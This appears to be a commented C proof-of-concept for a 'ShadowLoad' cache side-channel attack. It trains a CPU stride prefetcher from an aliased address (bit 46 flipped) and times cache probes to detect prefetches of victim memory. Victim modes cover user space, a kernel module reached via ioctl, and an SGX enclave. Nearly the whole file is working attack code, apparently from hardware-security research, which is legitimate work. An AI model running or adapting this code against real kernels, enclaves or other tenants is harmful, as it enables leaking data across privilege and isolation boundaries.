#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>

// 声明外部汇编函数：加载 gadget 的开始和结束
void load_gadget_start(void* address);
void load_gadget_end(void);

#define PAGE_SIZE 4096      // 定义页大小为 4KB
#define CACHE_LINE_SIZE 64  // 定义缓存行大小为 64 字节

/* 架构相关代码 */
#if defined(__x86_64__) // 如果是 x86-64 架构
#define maccess(x) asm volatile("mov (%0), %%rax" :: "r" (x) : "rax")   // 内存访问宏：将地址 x 的内容加载到 rax 寄存器。
#define nop() asm volatile("nop")   // 空操作宏
#define mfence() asm volatile("mfence") // 内存屏障宏
#define flush(x) asm volatile("clflush (%0)" :: "r" (x));   // 缓存行刷新宏
#ifdef APERF   // 如果定义了 APERF（一种性能计数器）
    static inline __attribute__((always_inline)) uint64_t _rdtsc(void) {
      uint64_t a, d;
      asm volatile("mfence");   // 内存屏障
      asm volatile("rdpru" : "=a" (a), "=d" (d) : "c" (1)); // 读取 APERF 寄存器（需要特定的 CPU 支持和权限）
      a = (d << 32) | a;    // 组合 64 位值
      asm volatile("mfence");   // 内存屏障
      return a;
    }
#else // 否则使用 rdtsc
static inline __attribute__((always_inline)) uint64_t _rdtsc(void) {
    uint64_t a, d;
    mfence();   // 内存屏障
    asm volatile("rdtsc" : "=a"(a), "=d"(d));   // 读取时间戳计数器
    a = (d << 32) | a;  // 组合 64 位值
    mfence();   // 内存屏障
    return a;
}
#endif /* APERF */ 
#elif defined (__aarch64__) // 如果是 ARM64 架构
#define maccess(x) asm volatile("ldr x0, [%0]" :: "r" (x) : "x0")   // 内存访问宏：加载到 x0 寄存器
#define nop() asm volatile("nop")   // 空操作宏
#define mfence() asm volatile("DSB SY\nISB")    // ARM 内存屏障（数据同步屏障和指令同步屏障）
static inline __attribute__((always_inline)) uint64_t _rdtsc(void) {
    uint64_t a;
    mfence();   // 内存屏障
    asm volatile("mrs %0, PMCCNTR_EL0" : "=r" (a));   // 读取性能监控计数器（PMCCNTR_EL0）
    mfence();   // 内存屏障
    return a;
}
static uint8_t evict_buffer[PAGE_SIZE * 1000];  // ARM 架构下用于驱逐缓存的缓冲区

#endif /* ARCHITECTURE */

#define VICTIM_BUFFER_SIZE (PAGE_SIZE * 5)  // 定义受害者缓冲区大小为 5 个页面

// measure time of memory load
static inline __attribute__((always_inline)) uint64_t probe(void* addr){
    uint64_t start, end;
    start = _rdtsc();
    maccess(addr);
    end = _rdtsc();
    return end - start;
}
    
// 冲突缓冲区：与受害者缓冲区共享相同的缓存集
uint8_t* colliding_buffer;
    
// 冲突加载指令：将用于触发预取器
void (*colliding_load)(void*);

#ifdef KERNEL_MODULE    // 如果针对内核模块进行攻击

#include <fcntl.h>
#include <sys/ioctl.h>
#include "kernel_module/shadowload_module.h"    // 内核模块头文件

int module_fd;  // 内核模块的文件描述符

// 刷新受害者缓冲区（通过 ioctl 调用内核模块刷新）
static void flush_victim_buffer(void) {
    ioctl(module_fd, CMD_FLUSH, 0); // 通知内核模块刷新其缓冲区
    
    #if defined (__x86_64__)
    #ifdef FLUSH_COLLIDING  // 如果定义了 FLUSH_COLLIDING，则也刷新用户空间的冲突缓冲区
    for(uint64_t offset = 0; offset < VICTIM_BUFFER_SIZE; offset += CACHE_LINE_SIZE) {
        flush(&colliding_buffer[offset]);
    }
    #endif /* FLUSH_COLLIDING */
    #endif /* __x86_64__ */
}

// 探测受害者缓冲区（通过 ioctl 调用内核模块探测）
static uint64_t probe_victim_buffer(uint64_t offset) {
    uint64_t io = offset;
    ioctl(module_fd, CMD_PROBE, &io);   // 通知内核模块探测指定偏移量，并将结果写回 io
    return io;  // 返回探测时间
}

// 调用受害者的加载小工具（通过 ioctl 调用内核模块执行加载）
static void load_gadget(uint64_t offset) {
    ioctl(module_fd, CMD_GADGET, offset);   
}

#elif defined (SGX) // 如果针对 SGX enclave 进行攻击

#include "sgx_enclave/sgx_victim.h" // SGX 受害者 enclave 的头文件

// 映射 SGX enclave 内部的函数到外部 C 函数
#define flush_victim_buffer sgx_flush_victim_buffer
#define probe_victim_buffer sgx_probe_victim_buffer
#define load_gadget sgx_load_gadget 

#else   // 否则在用户空间模拟受害者

static uint8_t* victim_buffer;  // 用户空间受害者缓冲区

// 刷新受害者缓冲区（在用户空间直接刷新）
static void flush_victim_buffer(void) {
    #if defined (__aarch64__)
    // 在 ARM64 上，用户空间没有统一的 clflush，所以使用驱逐（eviction）而不是直接刷新
    // no flushing available across all arm devices in userspace. Just use eviction
    for(int i = 0; i < 3; i++) {    // 多次循环以确保驱逐
        for(uint64_t offset = 0; offset < sizeof(evict_buffer); offset += 64) {
            maccess(&evict_buffer[offset]); // 访问大缓冲区以驱逐其他缓存行
        }
    }
    
    #else // x86_64
    for(uint64_t offset = 0; offset < VICTIM_BUFFER_SIZE; offset += CACHE_LINE_SIZE) {
        flush(&victim_buffer[offset]);  // 使用 clflush 刷新受害者缓冲区
        #ifdef FLUSH_COLLIDING  // 如果也需要刷新冲突缓冲区
        flush(&colliding_buffer[offset]);
        #endif /* FLUSH_COLLIDING */
    }
    #endif /* __aarch64__ */
}

// 探测受害者缓冲区（在用户空间直接探测）
static uint64_t probe_victim_buffer(uint64_t offset) {
    return probe(&victim_buffer[offset]);   // 调用本地 probe 函数
}

// 调用受害者的加载小工具（在用户空间直接调用汇编函数）
static void load_gadget(uint64_t offset) {
    load_gadget_start(&victim_buffer[offset]);  // 调用汇编中定义的 load_gadget_start
}

#endif /* KERNEL_MODULE */

// 比较 int64_t 类型的函数，用于 qsort
static int compare_int64(const void * a, const void * b) {
    return *(int64_t*)a - *(int64_t*)b;
}

// 计算缓存命中/未命中的时间阈值
static uint64_t calculate_threshold(){
    uint64_t vals[100];
    for(uint32_t i = 0; i < 1000000000; ++i) nop(); // 大量空操作以稳定 CPU 状态
    for(uint32_t i = 0; i < 100; i++){
        vals[i] = probe(&vals[50]); // 探测一个在缓存中的地址（自我探测）
        mfence();   // 内存屏障
    }
    qsort(vals, 100, sizeof(uint64_t), compare_int64);  // 对探测结果排序
    return vals[90] + 40;   // 返回第 90 个百分位的探测时间加上一个偏移量作为阈值
}

// ShadowLoad 攻击的核心函数
static uint64_t shadowload(uint64_t stride, int accesses, int aligned) {
    // 计算受害者缓冲区中的目标偏移量。
    // 如果 aligned 为真，表示模式对齐到 stride，受害者会访问 accesses * stride 处。
    // 如果 aligned 为假，受害者访问 0 处。
    uint64_t victim_offset = aligned ? accesses * stride : 0;
    
    flush_victim_buffer();  // 刷新受害者缓冲区，确保目标数据不在缓存中
    
    // 这很关键。如果没有这些 nop 操作，预取器可能不会被触发。
    // 这些 nop 操作可能提供一个时间窗口，让预取器处理前面的访问模式。
    for(int i = 0; i < 10000000; i++) nop();
    
    // repeating 5 times is not necessary, but there is no reason not to (and it may increase chance of success)
    // 重复 5 次以增加攻击成功率
    for(int repeat = 0; repeat < 5; repeat ++) {
        // 攻击者连续访问 colliding_buffer 中的地址，形成一个模式：stride, 2*stride, 3*stride...
        // 这一步旨在“训练”或“提示”CPU 的预取器。
        for(int access = 0; access < accesses; access++) {  // 进行accesses次训练
            colliding_load(&colliding_buffer[access * stride]); // 使用冲突加载指令访问
            mfence();   // 内存屏障
        }
        // 此时，如果预取器被训练成功，它可能会预测攻击者接下来会访问 colliding_buffer 的某个地址。
        // 由于 colliding_buffer 与 victim_buffer 物理地址别名，预取器可能会错误地预取 victim_buffer 中的数据。
        load_gadget(victim_offset); // 调用受害者的加载小工具，受害者会访问 victim_offset 处的内存
        mfence();
    }
    // 探测 victim_offset + stride 处的内存访问时间。
    // 如果预取器成功被欺骗并预取了 victim_buffer 的相应部分，那么这次探测会非常快（缓存命中）。
    // 这表明预取器“识别”了攻击者在 colliding_buffer 上的模式，并将其错误地应用到了 victim_buffer 上。
    return probe_victim_buffer(victim_offset + stride);
}


int main(int argc, char** argv) {
    
    // 让处理器进入稳定状态
    for(int i = 0; i < 100000000; i++) nop();
    
    // 冲突加载指令的地址
    uintptr_t colliding_load_address;
    
    // 冲突缓冲区的地址
    uintptr_t colliding_buffer_address;
    
    // 缓存命中/未命中的阈值
    uint64_t threshold = calculate_threshold();
    
    
    #ifdef KERNEL_MODULE    // 针对内核模块的特定初始化
    
    struct shadowload_kernel_info info;
    
    module_fd = open(SHADOWLOAD_MODULE_DEVICE_PATH, O_RDONLY);
    
    if(module_fd < 0) {
        fputs("unable to open module!\n", stderr);
        return -1;
    }
    
    // 从内核模块获取所需信息
    ioctl(module_fd, CMD_INFO, &info);
    // 获取内核模块提供的内核加载指令和缓冲区地址。
    // & 0x7fffffffffffull 可能用于清除高位，将其限制在典型的用户空间可访问地址范围或规范化地址。
    colliding_load_address = info.kernel_access & 0x7fffffffffffull;
    colliding_buffer_address  = info.kernel_buffer & 0x7fffffffffffull;
    
    #elif defined (SGX) // 针对 SGX enclave 的特定初始化
    
    threshold = 150;    // SGX 环境下可能需要不同的阈值

    if(sgx_start()){    // 启动 SGX enclave
        fputs("failed to start SGX victim!\n", stderr);
        return -1;
    }
    
    // 从 SGX enclave 获取信息。
    // 地址通过异或操作进行混淆，需要反转异或来获得正确的地址。
    sgx_get_info((void**)(void*)&colliding_load_address, (void**)(void*)&colliding_buffer_address);
    colliding_load_address ^= 1ull << 46ull;    // 反转第 46 位以获取真实地址
    colliding_buffer_address ^= 1ull << 46ull;  // 反转第 46 位以获取真实地址
    
    #else   // 在用户空间模拟受害者（默认情况）
    
    // map buffer in userspace (at any arbitrary address)
    // 在用户空间映射受害者缓冲区
    victim_buffer = mmap(NULL, VICTIM_BUFFER_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);
    if(victim_buffer == MAP_FAILED){
        fputs("unable to allocate buffer!", stderr);
        return -1;
    }

    // 冲突缓冲区地址和冲突加载指令地址通过翻转受害者缓冲区和 gadget 地址的第 46 位来生成。
    // 这是一种常见的技巧，用于在虚拟地址空间中创建物理地址别名，因为在某些系统上，高位虚拟地址的差异可能映射到相同的低位物理地址。
    // colliding buffer address is address of buffer but bit 46 flipped
    colliding_buffer_address = (uintptr_t)victim_buffer ^ (1ull << 46ull);
    
    // use address of gadget but flip bit 46
    colliding_load_address = (uintptr_t)load_gadget_start ^ (1ull << 46ull);
    
    #endif /* KERNEL_MODULE */
    
    // 映射冲突内存缓冲区
    colliding_buffer = mmap((void*) colliding_buffer_address, VICTIM_BUFFER_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_FIXED_NOREPLACE, -1, 0);
    if(colliding_buffer == MAP_FAILED) {
        fprintf(stderr, "failed to map colliding memory buffer to 0x%016zx\n", colliding_buffer_address);
        return -1;
    }
    
    // 映射冲突内存访问指令（load_gadget_start）
    // 映射包含 load_gadget_start 的页，并使其可执行。
    uint8_t* code_buf = mmap((void*)(colliding_load_address & 0x7ffffffff000ull), PAGE_SIZE * 2, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_FIXED_NOREPLACE, -1, 0);
    if(code_buf == MAP_FAILED) {
        fprintf(stderr, "unable to allocate colliding memory load to 0x%016zx\n", (uint64_t)(colliding_load_address & 0x7ffffffff000ull));
        return -1;
    }
    // 将 load_gadget_start 的汇编代码复制到映射的可执行内存中。
    memcpy(code_buf + (colliding_load_address & 0xfff), load_gadget_start, (uint8_t*)load_gadget_end - (uint8_t*)load_gadget_start);
    mprotect(code_buf, PAGE_SIZE * 2, PROT_READ | PROT_EXEC);   // 设置为可执行
    // 将 colliding_load 函数指针指向复制的 gadget 代码。
    colliding_load = (void*)(code_buf + (colliding_load_address & 0xfff));
    
//    printf("colliding buffer: %p\ncolliding load: %p\n", colliding_buffer, colliding_load);
    // 进行 ShadowLoad 攻击的实验循环
    for(int accesses = 1; accesses <= 8; accesses ++) { // 不同的访问次数（训练预取器的次数）
        for(uint64_t stride = 64; stride <= 2048; stride += 64) {   // 不同的步长
            for(int aligned = 0; aligned <= 1; aligned ++) {    // 对齐或不对齐模式
                int hits = 0;
                for(int repeat = 0; repeat < 100; repeat ++) {  // 重复 100 次以收集统计数据
                    // 调用 shadowload 函数执行一次攻击，如果探测时间低于阈值，则视为命中（预取成功）。
                    hits += shadowload(stride, accesses, aligned) < threshold;
                }
                // 打印结果：访问次数，步长，是否对齐，命中次数
                printf("%d %zu %d %d\n", accesses, stride, aligned, hits);
            }
        }
    }
    
    #ifdef SGX  // 如果是 SGX 模式，停止 enclave
    sgx_stop();
    #endif /* SGX */
    
}
